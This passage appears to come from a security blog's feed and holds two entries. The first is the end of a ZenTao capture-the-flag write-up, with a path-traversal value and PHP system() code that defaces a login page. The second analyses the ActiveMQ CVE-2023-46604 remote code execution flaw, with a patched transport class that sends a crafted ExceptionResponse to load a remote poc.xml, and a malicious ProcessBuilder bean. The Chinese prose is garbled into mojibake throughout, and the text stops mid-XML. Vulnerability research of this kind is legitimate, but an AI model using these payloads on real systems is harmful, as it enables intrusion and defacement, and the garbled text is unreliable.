å‚æ•°ï¼Œæ‰€ä»¥éœ€è¦åŠ ä¸Š -1</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/mkdir.png" class><p>è¿™ä¸€æ­¥æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿæ¥çœ‹åå° -&gt; äºŒæ¬¡å¼€å‘ -&gt; ç¼–è¾‘å™¨</p><p>å½“ä½ è¦ä¿®æ”¹æ–‡ä»¶çš„æ—¶å€™ä¼šé‡åˆ°è¿™ä¸ªé—®é¢˜</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/write.png" class><p>æ‰€ä»¥è¿™é‡Œå°±å¯ä»¥å†™å…¥ ok.txt ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">files[0]=../../../../../../../../../opt/zbox/app/zentao/www/data/ok.txt</span><br></pre></td></tr></table></figure><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/ok.png" class><p>éšåå°±å¯ä»¥ä½¿ç”¨ç¼–è¾‘å™¨è¿›è¡Œ shell çš„å†™å…¥äº†ï¼Œé¦–é¡µçš„ç•Œé¢æ˜¯ <code>/zentao/editor-save-L29wdC96Ym94L2FwcC96ZW50YW8vbW9kdWxlL3VzZXIvdmlldy9sb2dpbi5odG1sLnBocA-edit.html</code>ï¼Œå‚æ•°æ˜¯ b64 è¿‡å»çš„</p><p>ç›´æ¥åœ¨ç¼–è¾‘å™¨é‡Œé¢å†™é»‘é¡µ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo &quot;Hacked By Nepnep&quot; &gt; /opt/zbox/app/zentao/module/user/view/login.html.php&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å³å¯</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/shell.png" class><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>éš¾å—äº†ï¼Œä¸è¿‡ä¹Ÿå­¦åˆ°äº†å¾ˆå¤š</p>]]></content>
    
    
    <summary type="html">å¼ºç½‘æ¯ s7 å†³èµ› Zent WP</summary>
    
    
    
    <category term="WP" scheme="https://drun1baby.github.io/categories/WP/"/>
    
    
    <category term="WP" scheme="https://drun1baby.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-46604 Apache ActiveMQ RCE æ¼æ´åˆ†æ</title>
    <link href="https://drun1baby.github.io/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2024-01-05T11:44:02.000Z</published>
    <updated>2024-02-10T12:14:16.077Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-46604-Apache-ActiveMQ-RCE-æ¼æ´åˆ†æ"><a href="#CVE-2023-46604-Apache-ActiveMQ-RCE-æ¼æ´åˆ†æ" class="headerlink" title="CVE-2023-46604 Apache ActiveMQ RCE æ¼æ´åˆ†æ"></a>CVE-2023-46604 Apache ActiveMQ RCE æ¼æ´åˆ†æ</h1><h2 id="0x01-æ¼æ´æè¿°"><a href="#0x01-æ¼æ´æè¿°" class="headerlink" title="0x01 æ¼æ´æè¿°"></a>0x01 æ¼æ´æè¿°</h2><p>Apache ActiveMQ æ˜¯ç¾å›½ï¼ˆApacheï¼‰åŸºé‡‘ä¼šçš„ä¸€å¥—å¼€æºçš„æ¶ˆæ¯ä¸­é—´ä»¶ï¼Œå®ƒæ”¯æŒ Java æ¶ˆæ¯æœåŠ¡ã€é›†ç¾¤ã€Spring Framework ç­‰ã€‚</p><p>ActiveMQ é»˜è®¤å¼€æ”¾äº† 61616 ç«¯å£ç”¨äºæ¥æ”¶ OpenWire åè®®æ¶ˆæ¯ï¼Œç”±äºé’ˆå¯¹å¼‚å¸¸æ¶ˆæ¯çš„å¤„ç†å­˜åœ¨åå°„è°ƒç”¨é€»è¾‘ï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡æ„é€ æ¶æ„çš„åºåˆ—åŒ–æ¶ˆæ¯æ•°æ®åŠ è½½æ¶æ„ç±»ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h2 id="0x02-å½±å“ç‰ˆæœ¬"><a href="#0x02-å½±å“ç‰ˆæœ¬" class="headerlink" title="0x02 å½±å“ç‰ˆæœ¬"></a>0x02 å½±å“ç‰ˆæœ¬</h2><p>Apache ActiveMQ &lt; 5.18.3<br>Apache ActiveMQ &lt; 5.17.6<br>Apache ActiveMQ &lt; 5.16.7<br>Apache ActiveMQ &lt; 5.15.16</p><h2 id="0x03-ç¯å¢ƒæ­å»º"><a href="#0x03-ç¯å¢ƒæ­å»º" class="headerlink" title="0x03 ç¯å¢ƒæ­å»º"></a>0x03 ç¯å¢ƒæ­å»º</h2><p>å¯ä»¥æ ¹æ®è¿™é‡Œä¸‹è½½ <a class="link" href="https://activemq.apache.org/components/classic/download/">https://activemq.apache.org/components/classic/download/<i class="fas fa-external-link-alt"></i></a></p><p>ä¹Ÿå¯ä»¥è‡ªå·±èµ· docker</p><p>è¿™é‡Œçš„ maven æœ‰ä¸€ç‚¹å‘ï¼Œéœ€è¦å…ˆèµ·ä¸€ä¸ª spring çš„é¡¹ç›®ï¼Œç„¶åå†å¯¼å…¥ activemq-client çš„åŒ…</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.activemq<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>activemq-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.17.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-simple<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x04-æ¼æ´åˆ†æ"><a href="#0x04-æ¼æ´åˆ†æ" class="headerlink" title="0x04 æ¼æ´åˆ†æ"></a>0x04 æ¼æ´åˆ†æ</h2><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>diff ä»£ç </p><p><a class="link" href="https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f">https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" href="https://github.com/apache/activemq/blob/1d0a6d647e468334132161942c1442eed7708ad2/activemq-openwire-legacy/src/main/java/org/apache/activemq/openwire/v4/ExceptionResponseMarshaller.java">https://github.com/apache/activemq/blob/1d0a6d647e468334132161942c1442eed7708ad2/activemq-openwire-legacy/src/main/java/org/apache/activemq/openwire/v4/ExceptionResponseMarshaller.java<i class="fas fa-external-link-alt"></i></a></p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/diff.png" class><p>è¿™é‡Œçš„æ¼æ´çœ‹èµ·æ¥éå¸¸æ˜æ˜¾ï¼Œ<code>activemq-client/src/main/java/org/apache/activemq/openwire/v9/BaseDataStreamMarshaller#createThrowable</code> æ–¹æ³•ï¼Œé€šè¿‡åå°„è°ƒç”¨äº†ä»»æ„æ–¹æ³•ã€‚</p><p>è¿™é‡Œçš„ diff å¯ä»¥å¾ˆæ˜æ˜¾çœ‹åˆ°å¤šäº†ä¸ª <code>OpenWireUtil</code> ç±»ï¼Œç”¨æ¥å¤„ç†ä¸€ç§æŠ›å‡ºå¼‚å¸¸</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">validateIsThrowable</span><span class="params">(Class&lt;?&gt; clazz)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!Throwable.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Class &quot;</span> + clazz + <span class="string">&quot; is not assignable to Throwable&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†å¾€ä¸‹çœ‹ï¼Œè¿™é‡Œç»™äº† Test ç±»ï¼Œå‰é¢è¿™ä¸€æ®µä»£ç æ˜¯åœ¨å¤„ç†ååºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ExceptionResponse</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExceptionResponse</span>();  </span><br><span class="line">r.setException(<span class="keyword">new</span> <span class="title class_">Exception</span>());  </span><br><span class="line"><span class="type">ByteSequence</span> <span class="variable">bss</span> <span class="operator">=</span> format.marshal(r);  </span><br><span class="line"><span class="type">ExceptionResponse</span> <span class="variable">response</span> <span class="operator">=</span> (ExceptionResponse) format.unmarshal(bss);</span><br></pre></td></tr></table></figure><p>çœ‹ Test ç±»é‡Œé¢çš„ <code>getExceptionMarshaller()</code> æ–¹æ³•ï¼Œå…¶ä¸­éƒ½åˆ¤æ–­åˆ°äº†ä¸€ä¸ªç±» <strong>ExceptionResponseMarshaller</strong>ï¼Œè·Ÿè¿› <code>looseUnmarshal()</code> æ–¹æ³•ï¼Œå‘ç°ä¼šèµ°åˆ° <code>org.apache.activemq.openwire.v1.BaseDataStreamMarshaller#looseUnmarshalThrowable</code> æ–¹æ³•ã€‚<strong>BaseDataStreamMarshaller</strong> ç±»æ˜¯ç”¨äºæ”¯æŒåœ¨ ActiveMQ æ¶ˆæ¯ä¼ é€’ç³»ç»Ÿä¸­è¿›è¡Œæ•°æ®æµåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„åŸºç±»</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/looseUnmarsalThrowable.png" class><p>å¤§è‡´çš„æ¼æ´æ€è·¯ç›®å‰å·²ç»æ¯”è¾ƒæ˜ç¡®äº†ï¼Œæœ€ç»ˆè§¦å‘ç‚¹æ˜¯ <code>org.apache.activemq.openwire.v1.BaseDataStreamMarshaller#createThrowable</code>  æ–¹æ³•ï¼Œæœ‰ä¸¤ä¸ªæ–¹æ³•è°ƒç”¨äº†è¿™é‡Œï¼Œåˆ†åˆ«æ˜¯ <code>tightUnmarsalThrowable/looseUnmarsalThrowable</code>ï¼Œå…ˆä»¥ <code>looseUnmarsalThrowable</code> æ¥çœ‹ï¼Œå®ƒæ˜¯æ€ä¹ˆè¢«è°ƒç”¨çš„å‘¢ï¼Ÿæ˜¯ç”± <code>org.apache.activemq.openwire.v1.ExceptionResponseMarshaller#looseUnmarshal</code> æ–¹æ³•è°ƒç”¨çš„ã€‚è€Œ <code>ExceptionResponseMarshaller</code> æ˜¯ç”¨æ¥å¤„ç†ååºåˆ—åŒ–æŠ¥é”™çš„ï¼Œè¿™é‡Œå¯¹åº”çš„ç±»æ˜¯ <code>ExceptionResponse</code> ç±»ã€‚æ‰€ä»¥è¿™ä¸€æ¡æ”»å‡»é“¾è·¯è¿˜æ˜¯æ¯”è¾ƒæ¸…æ¥šçš„ï¼Œæµç¨‹å›¾å¦‚ä¸‹ã€‚</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/route.png" class><p>æ¥ä¸‹æ¥æ„é€ ä¸€ä¸ª Openwire åè®®çš„åŒ…ï¼Œå‘é€ï¼Œçœ‹ä¸€ä¸‹å¤„ç†æµç¨‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.activemq.ActiveMQConnectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.jms.Connection;</span><br><span class="line"><span class="keyword">import</span> javax.jms.ConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> javax.jms.Destination;</span><br><span class="line"><span class="keyword">import</span> javax.jms.MessageProducer;</span><br><span class="line"><span class="keyword">import</span> javax.jms.Session;</span><br><span class="line"><span class="keyword">import</span> javax.jms.TextMessage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ActiveMQProducer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">brokerUrl</span> <span class="operator">=</span> <span class="string">&quot;tcp://192.168.80.139:61616&quot;</span>;</span><br><span class="line">        <span class="type">ConnectionFactory</span> <span class="variable">connectionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActiveMQConnectionFactory</span>(brokerUrl);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> connectionFactory.createConnection();</span><br><span class="line">            <span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> connection.createSession(<span class="literal">false</span>, Session.AUTO_ACKNOWLEDGE);</span><br><span class="line">            <span class="type">Destination</span> <span class="variable">destination</span> <span class="operator">=</span> session.createQueue(<span class="string">&quot;yourQueueName&quot;</span>);</span><br><span class="line">            <span class="type">MessageProducer</span> <span class="variable">producer</span> <span class="operator">=</span> session.createProducer(destination);</span><br><span class="line">            <span class="type">TextMessage</span> <span class="variable">message</span> <span class="operator">=</span> session.createTextMessage(<span class="string">&quot;Hello, OpenWire!&quot;</span>);</span><br><span class="line">            producer.send(message);</span><br><span class="line">            System.out.println(<span class="string">&quot;Message sent successfully.&quot;</span>);</span><br><span class="line">            producer.close();</span><br><span class="line">            session.close();</span><br><span class="line">            connection.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”±äºè¿™ä¸€ä¸ªå·²ç»æ˜¯ Openwire åè®®å‘åŒ…çš„æ ¼å¼äº†ï¼Œæ‰€ä»¥ç›´æ¥åœ¨ <code>org.apache.activemq.openwire.OpenWireFormat#doUnmarshal</code> æ–¹æ³•ä¸‹æ–­ç‚¹ï¼Œæ¥è§‚æµ‹è°ƒè¯•ä¸€ä¸‹ã€‚</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/openwireDebug.png" class><p>å¾€ä¸‹èµ°ï¼Œå…ˆåˆ¤æ–­äº† dataType å˜é‡çš„å€¼ï¼Œä¸“é—¨æ‹¿å‡ºæ¥çœ‹ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°æ­¤å¤„ dataType ä¸º 28ï¼Œå¯¹åº”æ•°ç»„é‡Œé¢çš„ç±»ä¸º ActiveMQTextMessageMarshellerã€‚å¯¹åº”çš„åœ¨æˆ‘çš„ Producer ç”Ÿäº§è€…é‡Œé¢ç±»ä¸º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TextMessage</span> <span class="variable">message</span> <span class="operator">=</span> session.createTextMessage(<span class="string">&quot;Hello, OpenWire!&quot;</span>);</span><br><span class="line">producer.send(message);</span><br></pre></td></tr></table></figure><p>dataType ä¸º 28</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/datatype28.png" class><p>è€Œæˆ‘ä»¬éœ€è¦çš„ç±»æ˜¯ ExceptionResponseMarshallerï¼Œå¯¹åº” dataType çš„å€¼ä¸º 31ï¼Œæƒ³åŠæ³•è¿›è¡Œä¿®æ”¹ã€‚ActiveMQ çš„æµ‹è¯•ç±»æ¯”è¾ƒç²—æš´ï¼Œæ˜¯ç›´æ¥åˆ¤æ–­çš„ï¼Œè€Œä¸æ˜¯æ­£å¸¸çš„ producer å‘é€æ¶ˆæ¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ExceptionResponse</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExceptionResponse</span>();</span><br><span class="line">r.setException(<span class="keyword">new</span> <span class="title class_">Exception</span>());</span><br><span class="line"><span class="type">ByteSequence</span> <span class="variable">bss</span> <span class="operator">=</span> format.marshal(r);</span><br><span class="line"><span class="type">ExceptionResponse</span> <span class="variable">response</span> <span class="operator">=</span> (ExceptionResponse) format.unmarshal(bss);</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æ­¤å¤„ï¼Œæˆ‘ä¹Ÿéœ€è¦æ„é€ ä¸€ä¸ª ExceptionResponse ç±»å‘åŒ…ï¼Œæœ€å¼€å§‹æˆ‘çš„å°è¯•æ˜¯å°†å…¶ä½œä¸º message çš„ä¸€éƒ¨åˆ†ï¼Œä½†å…¶å®è¿™å¹¶æ²¡æœ‰ç”¨ï¼Œå› ä¸ºæœ€ç»ˆååºåˆ—åŒ–è¿˜æ˜¯ <code>TextMessage</code> è¿™ä¸ªç±»ã€‚</p><p>å°è¯•äº†ä¸€æ®µæ—¶é—´å‘ç°è¿™æ¡è·¯æ˜¯è¡Œä¸é€šçš„ï¼Œä½†æ˜¯æœ€ååˆæ˜¯å¯ä»¥ RCE çš„ï¼Œåªèƒ½ä»ä¸­é—´çš„æµç¨‹éƒ¨åˆ†ç€æ‰‹å‰–æï¼Œä¸€ç‚¹ç‚¹çœ‹äº†ã€‚çœ‹äº† X1r0z å¸ˆå‚…çš„åˆ†ææ–‡ç«  <a class="link" href="https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/">https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/<i class="fas fa-external-link-alt"></i></a> æ‰çŸ¥é“åŸæ¥æ˜¯å¦ä¸€ç§æ–¹å¼æ‰“çš„ï¼Œå¾ˆæœ‰æ„æ€ã€‚</p><p>é¦–å…ˆåœ¨ <code>org.apache.activemq.openwire.OpenWireFormat#marshal</code> ç³»åˆ—æ–¹æ³•ä¸‹æ–­ç‚¹ï¼Œå¾€å‰å¯ä»¥çœ‹åˆ° TcpTransport è¿™ä¸ªç±»</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/tcpTransport.png" class><p>å®ƒçš„ oneway æ–¹æ³•ä¼šè°ƒç”¨ <code>wireFormat.marshal()</code> å»åºåˆ—åŒ– command<br>command å°±æ˜¯å‰é¢å‡†å¤‡å‘é€çš„ ObjectMessage, è€Œ wireFormat å°±æ˜¯å’Œå®ƒå¯¹åº”çš„åºåˆ—åŒ–å™¨<br>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ‰‹åŠ¨ patch è¿™ä¸ªæ–¹æ³•, å°† command æ”¹æˆ ExceptionResponse, å°† wireFormat æ”¹æˆ ExceptionResponseMarshaller å³å¯</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/command.png" class><p>åœ¨å½“å‰æºç ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªÂ <code>org.apache.activemq.transport.tcp.TcpTransport</code>Â ç±», ç„¶åé‡å†™å¯¹åº”çš„é€»è¾‘, è¿™æ ·åœ¨è¿è¡Œçš„æ—¶å€™, å› ä¸º classpath æŸ¥æ‰¾é¡ºåºçš„é—®é¢˜, ç¨‹åºå°±ä¼šä¼˜å…ˆä½¿ç”¨å½“å‰æºç ç›®å½•é‡Œçš„ TcpTransport ç±»</p><p>ç„¶åæ˜¯ createThrowable æ–¹æ³•çš„åˆ©ç”¨, è¿™å—å…¶å®è·Ÿ PostgreSQL JDBC çš„åˆ©ç”¨ç±»ä¼¼, å› ä¸º ActiveMQ è‡ªå¸¦ spring ç›¸å…³ä¾èµ–, é‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨ ClassPathXmlApplicationContext åŠ è½½ XML å®ç° RCE</p><p><strong>TcpTransport.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">oneway</span><span class="params">(Object command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.checkStarted();</span><br><span class="line">        <span class="type">Throwable</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;http://127.0.0.1:8000/poc.xml&quot;</span>);</span><br><span class="line">        <span class="type">ExceptionResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExceptionResponse</span>(obj);</span><br><span class="line">        <span class="built_in">this</span>.wireFormat.marshal(response, <span class="built_in">this</span>.dataOut);</span><br><span class="line">        <span class="built_in">this</span>.dataOut.flush();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>ClassPathXmlApplicationContext.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.springframework.context.support;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassPathXmlApplicationContext</span> <span class="keyword">extends</span> <span class="title class_">Throwable</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClassPathXmlApplicationContext</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.message = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å› ä¸ºåœ¨ marshal çš„æ—¶å€™ä¼šè°ƒç”¨Â <code>o.getClass().getName()</code>Â è·å–ç±»å, è€Œ getClass æ–¹æ³•æ— æ³•é‡å†™ (final), æ‰€ä»¥æˆ‘åœ¨è¿™é‡ŒåŒæ · patch äº†Â <code>org.springframework.context.support.ClassPathXmlApplicationContext</code>, ä½¿å…¶ç»§æ‰¿ Throwable ç±»</p><p>å¦‚æ­¤ä¸€æ¥å°±å¯ä»¥æ‰“é€šäº†ï¼Œç¼–å†™æ¶æ„ XML å¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>touch<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span 